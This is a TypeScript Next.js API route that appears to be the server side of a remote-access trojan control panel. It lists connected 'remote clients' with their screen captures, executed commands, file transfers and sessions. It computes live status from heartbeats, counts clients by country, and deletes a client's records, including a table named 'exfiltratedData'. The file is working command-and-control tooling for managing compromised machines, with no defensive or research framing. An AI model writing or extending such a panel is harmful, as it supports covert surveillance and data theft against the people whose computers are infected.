import { NextResponse } from "next/server"
import { getServerSession } from "next-auth"
import { authOptions } from "@/lib/auth"
import { prisma } from "@/lib/prisma"

export async function GET() {
  try {
    const session = await getServerSession(authOptions)
    if (!session?.user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }

    const clients = await prisma.remoteClient.findMany({
      include: {
        builder: { select: { id: true, name: true } },
        screenCaptures: { orderBy: { createdAt: "desc" }, take: 8 },
        commands: { orderBy: { executedAt: "desc" }, take: 50 },
        fileTransfers: { orderBy: { startedAt: "desc" }, take: 20 },
        sessions: { orderBy: { connectedAt: "desc" }, take: 5 },
        _count: { select: { sessions: true, commands: true, screenCaptures: true, fileTransfers: true } },
      },
      orderBy: { lastSeen: "desc" },
    })

    const now = Date.now()

    // Dynamic status calculation based on heartbeat
    const enriched = clients.map((c) => {
      const hb = c.lastHeartbeat ? new Date(c.lastHeartbeat).getTime() : null
      let status = "offline"
      if (hb) {
        const diff = (now - hb) / 1000
        if (diff <= 90) status = "online"
        else if (diff <= 300) status = "idle"
      }
      return { ...c, status, heartbeatMs: hb ? now - hb : null }
    })

    // If there are clients with outdated status, update them occasionally
    // Update DB status for stale clients
    const outdated = clients.filter(c => {
      if (!c.lastHeartbeat) return false
      const diff = (now - new Date(c.lastHeartbeat).getTime()) / 1000
      if (diff > 300 && c.status !== "offline") return true
      if (diff > 90 && c.status === "online") return true
      return false
    })
    for (const c of outdated.slice(0, 50)) {
      const diff = (now - new Date(c.lastHeartbeat!).getTime()) / 1000
      const newStatus = diff > 300 ? "offline" : "idle"
      await prisma.remoteClient.update({
        where: { id: c.id },
        data: { status: newStatus },
      })
    }

    // Stats with dynamic status
    const online = enriched.filter(c => c.status === "online").length
    const idle = enriched.filter(c => c.status === "idle").length
    const offline = enriched.filter(c => c.status === "offline").length

    // Top countries
    const countryMap: Record<string, number> = {}
    enriched.forEach(c => {
      const n = c.country || "Unknown"
      countryMap[n] = (countryMap[n] || 0) + 1
    })
    const countries = Object.entries(countryMap)
      .map(([country, count]) => ({ country, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 15)

    const stats = {
      total: enriched.length,
      online,
      idle,
      offline,
      countries,
    }

    return NextResponse.json({ clients: enriched, stats })
  } catch (error) {
    console.error("[CLIENTS_GET]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}

export async function DELETE(req: Request) {
  try {
    const session = await getServerSession(authOptions)
    if (!session?.user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }

    const { id } = await req.json()
    if (!id) return NextResponse.json({ error: "id required" }, { status: 400 })

    const client = await prisma.remoteClient.findUnique({ where: { id } })
    if (!client) return NextResponse.json({ error: "Not found" }, { status: 404 })

    // Delete related data first
    await prisma.exfiltratedData.deleteMany({ where: { clientId: id } })
    await prisma.screenCapture.deleteMany({ where: { clientId: id } })
    await prisma.commandLog.deleteMany({ where: { clientId: id } })
    await prisma.fileTransfer.deleteMany({ where: { clientId: id } })
    await prisma.clientSession.deleteMany({ where: { clientId: id } })
    await prisma.remoteClient.delete({ where: { id } })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[CLIENTS_DELETE]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}
